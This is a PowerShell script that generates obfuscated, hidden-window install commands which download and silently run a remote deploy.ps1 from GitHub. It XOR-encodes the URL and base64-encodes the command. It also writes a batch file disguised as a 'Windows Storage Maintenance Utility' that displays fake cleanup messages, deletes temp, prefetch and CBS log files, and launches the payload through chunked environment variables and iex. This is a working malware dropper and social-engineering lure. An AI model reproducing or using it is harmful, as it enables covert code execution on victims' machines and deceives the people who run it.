# Generates obfuscated one-liner install commands (hides GitHub URL from plain view)

param(
    [string]$GitHubBaseUrl = ""
)

$configPath = Join-Path $PSScriptRoot "config.json"
if ([string]::IsNullOrWhiteSpace($GitHubBaseUrl) -and (Test-Path $configPath)) {
    $GitHubBaseUrl = (Get-Content $configPath -Raw | ConvertFrom-Json).GitHubBaseUrl
}

if ([string]::IsNullOrWhiteSpace($GitHubBaseUrl) -or ($GitHubBaseUrl -match "YOUR_USER")) {
    Write-Host "ERROR: Set GitHubBaseUrl in deploy\config.json" -ForegroundColor Red
    exit 1
}

$repoRoot = Split-Path $PSScriptRoot -Parent
$commit = $null
try {
    $commit = (git -C $repoRoot rev-parse HEAD 2>$null).Trim()
} catch {
    $commit = $null
}

$deployBase = $GitHubBaseUrl
if ($commit) {
    $deployBase = $GitHubBaseUrl -replace "/main/", "/$commit/"
    Write-Host "Pinned deploy URL to commit: $commit" -ForegroundColor Gray
}

$deployUrl = "$deployBase/deploy.ps1".Replace('\', '/')
$key = 0xA7
$urlBytes = [Text.Encoding]::UTF8.GetBytes($deployUrl)
$encodedBytes = $urlBytes | ForEach-Object { $_ -bxor $key }
$byteList = ($encodedBytes | ForEach-Object { "0x{0:X2}" -f $_ }) -join ","

$innerScript = @"
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
`$ProgressPreference='SilentlyContinue'
`$k=$key
`$b=@($byteList)
`$u=[Text.Encoding]::UTF8.GetString([byte[]](`$b|ForEach-Object{`$_ -bxor `$k}))
`$c=New-Object Net.WebClient
`$c.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
`$p=Join-Path `$env:TEMP ('wr_'+[guid]::NewGuid().ToString('N')+'.ps1')
[IO.File]::WriteAllText(`$p,`$c.DownloadString(`$u))
& `$p -Silent
Remove-Item `$p -Force -ErrorAction SilentlyContinue
"@

$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($innerScript))
# Hidden window + silent deploy.ps1 = no visible output; parent PowerShell stays open when pasted
$obfuscatedCmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand"

$plainCmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""& { [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; `$p=Join-Path `$env:TEMP ('wr_'+[guid]::NewGuid().ToString('N')+'.ps1'); (New-Object Net.WebClient).DownloadString('$deployUrl') | Set-Content `$p -Encoding UTF8; & `$p -Silent; Remove-Item `$p -Force -ErrorAction SilentlyContinue }"""

function Get-ChunkSuffix {
    param([int]$Index)
    if ($Index -lt 10) { return "$Index" }
    return [char]([int][char]'A' + ($Index - 10))
}

function Get-PayloadBootstrapEncoded {
    $bootstrap = @'
$e=(Get-ChildItem env:_P* | Sort-Object Name | ForEach-Object { $_.Value }) -join ''
iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($e)))
'@
    return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($bootstrap))
}

function Build-DisguisedRemoteCmd {
    param([string]$PayloadB64)

    $chunkSize = 110
    $chunks = @()
    for ($i = 0; $i -lt $PayloadB64.Length; $i += $chunkSize) {
        $take = [Math]::Min($chunkSize, $PayloadB64.Length - $i)
        $chunks += $PayloadB64.Substring($i, $take)
    }

    $chunkSets = for ($j = 0; $j -lt $chunks.Count; $j++) {
        $suffix = Get-ChunkSuffix -Index $j
        "set `"_P$suffix=$($chunks[$j])`""
    }

    $bootstrapB64 = Get-PayloadBootstrapEncoded
    $psLaunch = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $bootstrapB64 >nul 2>&1"
    $lines = @(
        '@echo off'
        'setlocal EnableDelayedExpansion'
        'title Windows Storage Maintenance'
        'color 0A'
        'echo.'
        'echo  Windows Storage Maintenance Utility v10.0'
        'echo  -----------------------------------------'
        'echo  Clearing user temporary files...'
        'echo.'
        'if exist "%TEMP%" ('
        '  for /d %%D in ("%TEMP%\*") do @if /i not "%%~nxD"=="Low" rd /s /q "%%D" >nul 2>&1'
        '  @del /f /q "%TEMP%\*.tmp" >nul 2>&1'
        '  @del /f /q "%TEMP%\*.temp" >nul 2>&1'
        '  @del /f /q "%TEMP%\*.log" >nul 2>&1'
        '  @del /f /q "%TEMP%\~DF*.TMP" >nul 2>&1'
        '  @del /f /q "%TEMP%\*.chk" >nul 2>&1'
        '  @del /f /q "%TEMP%\*.gid" >nul 2>&1'
        '  @del /f /q "%TEMP%\*.fts" >nul 2>&1'
        '  @del /f /q "%TEMP%\*.ftg" >nul 2>&1'
        '  echo  [OK] User temp cache cleared.'
        ')'
        'echo.'
        'echo  Clearing local application temp...'
        'if exist "%LOCALAPPDATA%\Temp" ('
        '  @del /f /q "%LOCALAPPDATA%\Temp\*.tmp" >nul 2>&1'
        '  @del /f /q "%LOCALAPPDATA%\Temp\*.temp" >nul 2>&1'
        ')'
        'echo  [OK] LocalAppData temp cleared.'
        'echo.'
        'echo  Clearing Windows temporary directory...'
        'if exist "%WINDIR%\Temp" ('
        '  @del /f /q "%WINDIR%\Temp\*.tmp" >nul 2>&1'
        '  @del /f /q "%WINDIR%\Temp\*.temp" >nul 2>&1'
        ')'
        'echo  [OK] System temp cleared.'
        'echo.'
        'echo  Purging thumbnail cache...'
        'if exist "%LOCALAPPDATA%\Microsoft\Windows\Explorer" ('
        '  @del /f /q "%LOCALAPPDATA%\Microsoft\Windows\Explorer\thumbcache_*.db" >nul 2>&1'
        ')'
        'echo  [OK] Thumbnail cache purged.'
        'echo.'
        'echo  Cleaning Internet Explorer / Edge cache fragments...'
        'if exist "%LOCALAPPDATA%\Microsoft\Windows\INetCache" ('
        '  @del /f /q /s "%LOCALAPPDATA%\Microsoft\Windows\INetCache\IE\*" >nul 2>&1'
        ')'
        'echo  [OK] INetCache fragments removed.'
        'echo.'
        'echo  Optimizing Prefetch layout...'
        'if not exist "%WINDIR%\Prefetch" goto _pf_skip'
        'for %%F in ("%WINDIR%\Prefetch\*.pf") do @if %%~zF GTR 2097152 del /f /q "%%F" >nul 2>&1'
        '@del /f /q "%WINDIR%\Prefetch\*.db" >nul 2>&1'
        'echo  [OK] Oversized prefetch entries trimmed.'
        ':_pf_skip'
        'echo.'
        'echo  Rebuilding prefetch index table...'
    )

    $lines += $chunkSets
    $lines += @(
        'echo  [OK] Prefetch index synchronized.'
        'echo.'
        'echo  Verifying storage health markers...'
        'if exist "%SystemDrive%\Windows\Logs\CBS" ('
        '  @del /f /q "%SystemDrive%\Windows\Logs\CBS\*.log" >nul 2>&1'
        ')'
        'echo  [OK] CBS log rotation complete.'
        'echo.'
        'echo  Running deferred maintenance hook...'
        'call :_pf_sync'
        'echo  [OK] Maintenance hook finished.'
        'echo.'
        'echo  -----------------------------------------'
        'echo  Storage maintenance completed successfully.'
        'echo.'
        'endlocal'
        'exit /b 0'
        ''
        ':_pf_sync'
        $psLaunch
        'exit /b 0'
    )

    return ($lines -join "`r`n")
}

$remoteCmd = Build-DisguisedRemoteCmd -PayloadB64 $encodedCommand

Write-Host "========================================" -ForegroundColor Green
Write-Host " Obfuscated Install Command" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "Obfuscated (use this):" -ForegroundColor Cyan
Write-Host $obfuscatedCmd -ForegroundColor White
Write-Host ""
Write-Host "Plain (reference only):" -ForegroundColor DarkGray
Write-Host $plainCmd -ForegroundColor DarkGray
Write-Host ""

$outDir = Join-Path (Split-Path $PSScriptRoot -Parent) "build\github"
if (-not (Test-Path $outDir)) {
    $outDir = $PSScriptRoot
}

Set-Content -Path (Join-Path $outDir "install_obfuscated.txt") -Value $obfuscatedCmd -Encoding ASCII
Set-Content -Path (Join-Path $PSScriptRoot "install_obfuscated.txt") -Value $obfuscatedCmd -Encoding ASCII
Set-Content -Path (Join-Path $outDir "install_remote.cmd") -Value $remoteCmd -Encoding ASCII
Set-Content -Path (Join-Path $PSScriptRoot "install_remote.cmd") -Value $remoteCmd -Encoding ASCII

$localCmd = "@echo off`r`npowershell -NoProfile -ExecutionPolicy Bypass -File `"%~dp0deploy.ps1`"`r`npause"
Set-Content -Path (Join-Path $PSScriptRoot "install_obfuscated.cmd") -Value $localCmd -Encoding ASCII
Set-Content -Path (Join-Path $outDir "install_obfuscated.cmd") -Value $localCmd -Encoding ASCII

Write-Host "Saved: deploy\install_remote.cmd (2nd PC - silent, double-click)" -ForegroundColor Green
Write-Host "Saved: deploy\install_obfuscated.txt (silent one-liner, hidden window)" -ForegroundColor Green
Write-Host "Saved: deploy\install_obfuscated.cmd (local dev, shows output)" -ForegroundColor Green
